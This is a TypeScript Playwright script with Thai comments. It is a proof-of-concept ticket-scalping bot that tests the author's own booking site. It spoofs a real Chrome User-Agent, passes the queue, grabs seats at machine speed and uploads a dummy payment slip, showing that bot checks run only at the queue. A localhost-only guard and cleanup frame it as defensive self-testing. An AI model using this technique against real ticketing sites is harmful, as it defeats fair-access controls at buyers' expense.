// ============================================================
// ATTACK PoC — บอทกดบัตร (adversarial self-test ของระบบตัวเอง)
// ============================================================
// ⚠️ ใช้ยิงใส่ "instance ของเราเอง" (localhost/preview ที่เราคุม) เท่านั้น
//    ห้ามชี้ไปเว็บจองบัตรจริงของใคร — สคริปต์นี้ตั้งใจสาธิตช่องโหว่ของโปรเจกต์นี้
//    เพื่อพิสูจน์ว่ากันได้/ไม่ได้ตรงไหน (เนื้อหาบท "ผู้โจมตี vs ผู้ป้องกัน" ของวิทยานิพนธ์)
//
// รัน:  npx tsx scripts/attack-bot.ts            (ต้อง pnpm dev + pnpm db:up อยู่)
//       BOTS=5 npx tsx scripts/attack-bot.ts     (ยิงพร้อมกัน 5 ตัว)
//       KEEP=1 npx tsx scripts/attack-bot.ts     (ไม่ cleanup — เก็บ order ไว้ดูใน admin)
//
// ช่องโหว่ที่สาธิต (ตรงกับ docs/SECURITY_TODO.md ข้อ 1):
//   Anti-bot (Layer 1 scoring + Layer 2 behavior) ทำงาน "แค่ที่ประตูหน้า" = /api/queue/join
//   พอผ่านคิวได้ token แล้ว → ทาง holdAndCreateOrder → submitSlip (server action)
//   "ไม่มี" การตรวจ bot-score/Turnstile/behavior ซ้ำอีกเลย
//   => บอทที่ผ่านประตูหน้ามาได้ (dev: Turnstile test-key ผ่านเสมอ / จริง: captcha farm แก้ครั้งเดียว)
//      กดซื้อจนจบด้วยความเร็วเครื่อง เร็วกว่าคนคลิก UI หลายเท่า → แย่งที่นั่งดีไปก่อน
//
// ทำไมบอทนี้ "ไม่ติด" ของเดิม:
//   - ตั้ง User-Agent เป็น Chrome จริง (ไม่มีคำว่า headless) → UA signal = 0 คะแนน
//   - Layer 2 behavior (mouse entropy/dwell) วัดเฉพาะตอน join — ทางซื้อไม่วัด → ไม่ขยับเมาส์ก็รอด
import { chromium, type Browser } from "playwright-core";
import { writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { prisma } from "../lib/prisma";
import { redis } from "../lib/redis";

// ---- config ----
const BASE = process.env.E2E_BASE ?? "http://localhost:3000";
const SLUG = process.env.SLUG ?? "bts-bangkok-2026";
const N_BOTS = Number(process.env.BOTS ?? 1); // จำนวนบอทที่ยิงพร้อมกัน
const KEEP = process.env.KEEP === "1"; // ไม่ cleanup (เก็บ order ไว้ดู)

// ยามกันยิงผิดเป้า: ถ้าไม่ใช่ localhost/127.0.0.1 ต้องยืนยันด้วย I_OWN_THIS_TARGET=1
const isLocal = /^https?:\/\/(localhost|127\.0\.0\.1)(:|\/|$)/.test(BASE);
if (!isLocal && process.env.I_OWN_THIS_TARGET !== "1") {
  console.error(
    `\n⛔ BASE=${BASE} ไม่ใช่ localhost — ปฏิเสธการรัน\n` +
      `   สคริปต์นี้สำหรับทดสอบ instance ของตัวเองเท่านั้น\n` +
      `   ถ้าเป็น preview/staging ที่คุณเป็นเจ้าของจริง ตั้ง I_OWN_THIS_TARGET=1 เพื่อยืนยัน\n`
  );
  process.exit(1);
}

// UA จริง (สำคัญ: กัน Layer-1 ให้คะแนน UA เป็นบอท)
const REAL_UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

// รูปสลิป 1x1 png (dev mock ไม่เช็ค content แค่ต้องเป็นรูปผ่าน validation)
const PNG_1x1 = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
  "base64"
);

// pool บัญชีบอท — ticket-limit เป็น per-user ดังนั้นบอทหลายตัวต้องคนละบัญชี
// (dev seed มี user@local; ถ้าจะยิงหลายตัวจริง สร้าง bot1@local..botN@local เพิ่มใน seed)
const ACCOUNTS = (process.env.ACCOUNTS ?? "user@local")
  .split(",")
  .map((e) => e.trim())
  .filter(Boolean);
const PASSWORD = process.env.BOT_PASSWORD ?? "Password123!";

interface BotResult {
  id: number;
  email: string;
  ok: boolean;
  orderId: string | null;
  seats: number;
  ms: number;
  note: string;
}

// บอท 1 ตัว: login → คิว → คว้าที่นั่งเร็วสุด → checkout → แนบสลิป → ได้ตั๋ว
async function runBot(browser: Browser, id: number, email: string): Promise<BotResult> {
  const t0 = Date.now();
  const slipPath = join(tmpdir(), `attack-slip-${id}-${Date.now()}.png`);
  writeFileSync(slipPath, PNG_1x1);

  const context = await browser.newContext({
    userAgent: REAL_UA, // ปลอมเป็น Chrome จริง
    viewport: { width: 1280, height: 900 },
    locale: "th-TH",
  });
  const page = await context.newPage();
  let orderId: string | null = null;
  let seats = 0;

  try {
    // 1) login (ยิงฟอร์มตรงๆ ไม่ต้องมี human behavior)
    await page.goto(`${BASE}/login`, { waitUntil: "domcontentloaded" });
    await page.fill("#email", email);
    await page.fill("#password", PASSWORD);
    await page.click('button[type="submit"]');
    await page.waitForURL((u) => !u.pathname.includes("/login"), { timeout: 20_000 });

    // 2) ประตูหน้า = คิว. dev: Turnstile test-key ผ่านเอง → ถูก admit → เด้งไป /seats?qt=
    //    (จุดเดียวที่ anti-bot ทำงาน — บอทผ่านได้เพราะ UA เนียน + dev auto-pass)
    await page.goto(`${BASE}/concerts/${SLUG}/queue`, { waitUntil: "domcontentloaded" });
    await page.waitForURL(/\/seats\?qt=/, { timeout: 60_000 });

    // 3) หลังผ่านประตู = โซนไร้ยาม. คว้าที่นั่งว่าง "ทันที" ด้วยความเร็วเครื่อง
    //    ไม่ขยับเมาส์ ไม่มี dwell — Layer 2 ไม่วัดตรงนี้อยู่แล้ว
    const seatBtns = page.locator("main button[title]:not([disabled])");
    await seatBtns.first().waitFor({ timeout: 15_000 });
    const avail = await seatBtns.count();
    const grab = Math.min(2, avail); // คว้า 2 ที่ (หรือเท่าที่มี)
    for (let i = 0; i < grab; i++) await seatBtns.nth(i).click();
    seats = grab;

    // 4) hold + สร้าง order (server action — ไม่มีการตรวจ bot ซ้ำ)
    await page.getByRole("button", { name: /ดำเนินการชำระเงิน/ }).click();
    await page.waitForURL(/\/checkout\//, { timeout: 20_000 });
    orderId = page.url().split("/checkout/")[1]?.split(/[/?#]/)[0] ?? null;

    // 5) แนบสลิป → ยืนยัน (dev: verifySlip mock ผ่าน)
    await page.setInputFiles('input[type="file"]', slipPath);
    await page.getByText(/แนบแล้ว/).waitFor({ timeout: 8_000 });
    await page.getByRole("button", { name: /ยืนยันการชำระเงิน/ }).click();
    await page.waitForURL(/\/account\/tickets/, { timeout: 20_000 });

    return { id, email, ok: true, orderId, seats, ms: Date.now() - t0, note: "ได้ตั๋วสำเร็จ" };
  } catch (e) {
    return {
      id,
      email,
      ok: false,
      orderId,
      seats,
      ms: Date.now() - t0,
      note: (e as Error).message.split("\n")[0],
    };
  } finally {
    await context.close();
  }
}

// คืนที่นั่ง/ลบ order ของรอบนี้ (attack จริงไม่ทำ — แต่เราทดสอบ dev ตัวเอง เลยเก็บกวาด)
async function cleanup(orderIds: string[]) {
  for (const id of orderIds) {
    try {
      const oid = BigInt(id);
      const items = await prisma.orderItem.findMany({ where: { orderId: oid }, select: { seatId: true } });
      const seatIds = items.map((i) => i.seatId);
      await prisma.ticket.deleteMany({ where: { orderId: oid } });
      await prisma.payment.deleteMany({ where: { orderId: oid } });
      await prisma.orderItem.deleteMany({ where: { orderId: oid } });
      await prisma.order.delete({ where: { id: oid } });
      if (seatIds.length) {
        await prisma.seat.updateMany({ where: { id: { in: seatIds } }, data: { status: "AVAILABLE" } });
        await redis.del(...seatIds.map((s) => `seat:lock:${s}`));
      }
    } catch {
      /* ข้าม order ที่ลบไม่ได้ */
    }
  }
  // เคลียร์ queue slot ของบัญชีบอทในคอนเสิร์ตนี้ (กัน dedup รอบหน้า)
  const c = await prisma.concert.findUnique({ where: { slug: SLUG }, select: { id: true } });
  if (c) {
    for (const email of ACCOUNTS) {
      const u = await prisma.user.findUnique({ where: { email }, select: { id: true } });
      if (u) await redis.del(`queue:${c.id}:user:${u.id}`);
    }
  }
}

async function main() {
  console.log(`\n🤖 ATTACK PoC — ยิง ${N_BOTS} บอท ใส่ ${BASE} (concert=${SLUG})`);
  console.log(`   บัญชี: ${ACCOUNTS.join(", ")}\n`);

  const browser = await chromium.launch({ headless: true });
  try {
    // ยิงทุกตัว "พร้อมกัน" — จำลอง flash-crowd ของบอท
    const jobs = Array.from({ length: N_BOTS }, (_, i) =>
      runBot(browser, i + 1, ACCOUNTS[i % ACCOUNTS.length])
    );
    const results = await Promise.all(jobs);

    // รายงาน
    console.log(`${"=".repeat(56)}`);
    let won = 0;
    for (const r of results) {
      const tag = r.ok ? "✅ ได้ตั๋ว" : "❌ พลาด";
      if (r.ok) won++;
      console.log(
        `  บอท#${r.id} [${r.email}]  ${tag}  ${r.seats} ที่  ${r.ms}ms  ${r.ok ? `order=${r.orderId}` : r.note}`
      );
    }
    console.log("=".repeat(56));
    console.log(`สรุป: ${won}/${N_BOTS} บอทกดบัตรสำเร็จ (ไม่มีมนุษย์แตะเลย)`);
    if (won > 0) {
      console.log(
        `\n💡 ช่องโหว่ยืนยัน: บอทผ่านประตูคิวแล้ว ซื้อจนจบโดยไม่โดนตรวจ bot ซ้ำ` +
          `\n   fix: ใส่ recheck bot-score ใน holdAndCreateOrder (SECURITY_TODO #1)`
      );
    }

    if (!KEEP) {
      await cleanup(results.map((r) => r.orderId).filter((x): x is string => !!x));
      console.log("\n🧹 cleanup: ลบ order + คืนที่นั่งแล้ว (ตั้ง KEEP=1 ถ้าอยากเก็บไว้ดู)");
    }
  } finally {
    await browser.close();
    await prisma.$disconnect();
    await redis.quit();
  }
}

main();
